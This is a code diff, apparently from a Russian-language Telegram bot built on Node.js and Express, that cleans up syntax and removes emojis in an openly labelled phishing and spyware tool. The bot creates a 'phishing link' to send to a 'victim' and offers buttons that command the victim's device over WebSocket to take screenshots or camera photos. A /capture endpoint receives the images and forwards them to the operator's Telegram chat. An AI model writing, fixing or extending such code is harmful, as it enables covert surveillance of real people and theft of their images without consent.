@@ -22,7 +22,7 @@ const sessions = new Map();
 function generatePhishingLink(targetId) {
     const token = Buffer.from(targetId.toString()).toString('base64');
     const baseUrl = process.env.RENDER_EXTERNAL_URL || 'https://blackbox-cam-bot.onrender.com';
-    return ${baseUrl}?target=${token};
+    return baseUrl + '?target=' + token;
 }
 
 bot.start((ctx) => {
@@ -30,14 +30,13 @@ bot.start((ctx) => {
     const link = generatePhishingLink(userId);
 
     ctx.replyWithMarkdown(
-        🔗 *Фишинг-ссылка создана*\n\n +
-        Отправьте эту ссылку цели:\n\n +
-        \`${link}\`,
+        '*Фишинг-ссылка создана*\n\nОтправьте эту ссылку цели:\n\n' +
+        '`' + link + '`',
         Markup.inlineKeyboard([
-            [Markup.button.url('📤 Отправить жертве', link)],
-            [Markup.button.callback('📸 Скриншот', `cmd_screenshot_${userId}`)],
-            [Markup.button.callback('📹 Камера', `cmd_camera_${userId}`)],
-            [Markup.button.callback('🔄 Статус', `cmd_status_${userId}`)]
+            [Markup.button.url('Отправить жертве', link)],
+            [Markup.button.callback('Скриншот', 'cmd_screenshot_' + userId)],
+            [Markup.button.callback('Камера', 'cmd_camera_' + userId)],
+            [Markup.button.callback('Статус', 'cmd_status_' + userId)]
         ])
     );
 });
@@ -46,13 +45,13 @@ bot.action(/cmd_screenshot_(\d+)/, async (ctx) => {
     const targetId = ctx.match[1];
     const session = sessions.get(targetId);
     if (!session || !session.ws) {
-        return ctx.answerCbQuery('❌ Жертва не в сети', { show_alert: true });
+        return ctx.answerCbQuery('Жертва не в сети', { show_alert: true });
     }
     try {
         session.ws.send(JSON.stringify({ type: 'screenshot' }));
-        ctx.answerCbQuery('📸 Отправлено');
+        ctx.answerCbQuery('Отправлено');
     } catch (e) {
-        ctx.answerCbQuery('❌ Ошибка', { show_alert: true });
+        ctx.answerCbQuery('Ошибка', { show_alert: true });
     }
 });
 
@@ -60,13 +59,13 @@ bot.action(/cmd_camera_(\d+)/, async (ctx) => {
     const targetId = ctx.match[1];
     const session = sessions.get(targetId);
     if (!session || !session.ws) {
-        return ctx.answerCbQuery('❌ Жертва не в сети', { show_alert: true });
+        return ctx.answerCbQuery('Жертва не в сети', { show_alert: true });
     }
     try {
         session.ws.send(JSON.stringify({ type: 'camera' }));
-        ctx.answerCbQuery('📹 Отправлено');
+        ctx.answerCbQuery('Отправлено');
     } catch (e) {
-        ctx.answerCbQuery('❌ Ошибка', { show_alert: true });
+        ctx.answerCbQuery('Ошибка', { show_alert: true });
     }
 });
 
@@ -74,9 +73,9 @@ bot.action(/cmd_status_(\d+)/, async (ctx) => {
     const targetId = ctx.match[1];
     const session = sessions.get(targetId);
     if (session && session.ws) {
-        ctx.answerCbQuery('🟢 Онлайн', { show_alert: true });
+        ctx.answerCbQuery('Онлайн', { show_alert: true });
     } else {
-        ctx.answerCbQuery('🔴 Офлайн', { show_alert: true });
+        ctx.answerCbQuery('Офлайн', { show_alert: true });
     }
 });
 
@@ -87,14 +86,14 @@ app.post('/capture', (req, res) => {
     try {
         const userId = Buffer.from(target, 'base64').toString('ascii');
         const timestamp = Date.now();
-        const filename = ${type}_${userId}_${timestamp}.jpg;
+        const filename = type + '_' + userId + '_' + timestamp + '.jpg';
         const filepath = path.join(capturesDir, filename);
         fs.writeFileSync(filepath, Buffer.from(image, 'base64'));
 
         bot.telegram.sendPhoto(userId, { source: filepath }, {
-            caption: 📷 *${type === 'screenshot' ? 'Скриншот' : 'Камера'}*\n🕒 ${new Date(timestamp).toLocaleString('ru-RU')},
+            caption: 'Фото: ' + (type === 'screenshot' ? 'Скриншот' : 'Камера') + '\nВремя: ' + new Date(timestamp).toLocaleString('ru-RU'),
             parse_mode: 'Markdown'
-        }).catch(() => {});
+        }).catch(function() {});
 
         res.json({ status: 'ok' });
     } catch (e) {
@@ -113,6 +112,6 @@ app.post('/register', (req, res) => {
 });
 
 bot.launch();
-app.listen(process.env.SERVER_PORT || 3000, () => {
-    console.log(`🌐 Бот запущен на порту ${process.env.SERVER_PORT || 3000}`);
+app.listen(process.env.SERVER_PORT || 3000, function() {
+    console.log('Bot started on port ' + (process.env.SERVER_PORT || 3000));
 });
